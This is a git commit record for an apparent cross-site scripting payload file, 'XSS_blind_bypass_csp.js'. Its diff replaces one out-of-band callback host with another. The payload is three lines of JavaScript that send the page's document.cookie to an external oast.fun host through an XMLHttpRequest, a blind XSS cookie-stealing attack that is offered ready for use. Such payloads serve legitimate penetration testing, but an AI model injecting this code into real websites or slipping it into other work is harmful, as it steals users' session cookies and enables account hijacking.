26e102d10491a711c45a4ce8dbcee50b48986448
PungJL <59461655+JLPung@users.noreply.github.com>
2024-08-27 21:16:27 +0800

    Update XSS_blind_bypass_csp.js

--- XSS_blind_bypass_csp.js
+++ XSS_blind_bypass_csp.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://ckp5dg62vtc0000efpk0gj5nsayyyyyyb.oast.fun/?' + document.cookie, true);
+xhttp.open('GET', 'http://dmmbqkffwcyxfvtdobmh7d6in8m5eojye.oast.fun/?' + document.cookie, true);
 xhttp.send();
